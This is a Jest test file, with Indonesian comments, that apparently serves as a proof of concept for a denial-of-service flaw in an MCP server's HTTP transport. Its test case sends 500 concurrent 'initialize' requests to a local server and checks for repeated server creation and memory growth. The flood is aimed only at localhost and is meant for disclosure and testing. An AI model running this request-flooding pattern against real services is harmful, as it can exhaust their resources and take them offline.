import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import express from 'express';
import http from 'node:http';
import { StreamableHttpTransport } from '../../server/transport/streamable-http.js';
import { getServer } from '../../server/server.js';

// Mock fetch untuk memantau berapa kali Mintlify dipanggil tanpa benar-benar keluar jaringan
let mintlifyCallCount = 0;
const originalFetch = global.fetch;
global.fetch = async (url: string | URL | Request, init?: RequestInit) => {
    const urlString = url.toString();
    if (urlString.includes('leaves.mintlify.com')) {
        mintlifyCallCount++;
        // Simulasi delay jaringan agar efek concurrency lebih terasa
        await new Promise(resolve => setTimeout(resolve, 50));
        return new Response(JSON.stringify({
            name: 'mock',
            trieveDatasetId: 'mock-id',
            trieveApiKey: 'mock-key'
        }), { status: 200, headers: { 'Content-Type': 'application/json' } });
    }
    return originalFetch(url, init);
} as typeof fetch;

describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', () => {
    let transport: StreamableHttpTransport;
    let app: express.Application;
    let server: http.Server;

    beforeAll(async () => {
        // Inisialisasi transport streamable-http
        transport = new StreamableHttpTransport(0, 'localhost', '/mcp', 'disabled');
        
        // Karena kita tidak memanggil start() untuk menghindari binding port asli,
        // kita inject app express secara manual untuk testing
        // @ts-ignore - Akses internal app
        app = transport.app;
        if (!app) {
            // Fallback jika app tidak ter-expose, buat manual mock app
            app = express();
            app.use(express.json());
            app.post('/mcp', async (req, res) => {
                try {
                    const mcpServer = await getServer();
                    const { StreamableHTTPServerTransport } = await import('@modelcontextprotocol/sdk/server/streamableHttp.js');
                    const httpTransport = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined });
                    res.on('close', () => {
                        httpTransport.close();
                        mcpServer.close();
                    });
                    await mcpServer.connect(httpTransport);
                    await httpTransport.handleRequest(req, res, req.body);
                } catch (error) {
                    res.status(500).json({ error: 'Internal Server Error' });
                }
            });
        }

        server = app.listen(0); // Port 0 = random free port
    });

    afterAll(() => {
        server.close();
        global.fetch = originalFetch;
    });

    it('should trigger external fetch and memory exhaustion on concurrent requests', async () => {
        const port = (server.address() as any).port;
        const targetUrl = `http://localhost:${port}/mcp`;
        
        const payload = {
            jsonrpc: '2.0',
            method: 'initialize',
            params: { protocolVersion: '2024-11-05', capabilities: {} },
            id: 1
        };

        // Catat memory sebelum serangan
        const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
        const initialMintlifyCalls = mintlifyCallCount;
        console.log(`[Before Attack] Memory usage: ${memBefore.toFixed(2)} MB`);

        // Simulasi serangan DoS: 500 request concurrent
        const attackCount = 500;
        console.log(`[Attack] Sending ${attackCount} concurrent requests to ${targetUrl}...`);
        
        const requests = [];
        for (let i = 0; i < attackCount; i++) {
            // Kita tidak perlu peduli response berhasil atau gagal (Server Error 500 pun tidak masalah)
            // Yang penting adalah handler getServer() tereksekusi
            requests.push(
                fetch(targetUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {}) // Abaikan error fetch (seperti ECONNRESET jika server crash)
            );
        }

        // Tunggu semua request selesai (atau gagal karena server crash)
        await Promise.all(requests);

        // Catat memory setelah serangan
        const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
        const totalMintlifyCalls = mintlifyCallCount - initialMintlifyCalls;

        console.log(`[After Attack] Memory usage: ${memAfter.toFixed(2)} MB`);
        console.log(`[Impact] Outbound calls to Mintlify triggered: ${totalMintlifyCalls}`);

        // VERDICT: Jika getServer() dipanggil per request, mintlifyCallCount harusnya sama dengan attackCount
        expect(totalMintlifyCalls).toBe(attackCount);
        
        // Verifikasi bahwa memori membengkak signifikan (indikasi kebocoran object McpServer)
        // Karena GC mungkin berjalan, kita hanya cek apakah ada peningkatan drastis
        expect(memAfter).toBeGreaterThan(memBefore);
    });
});
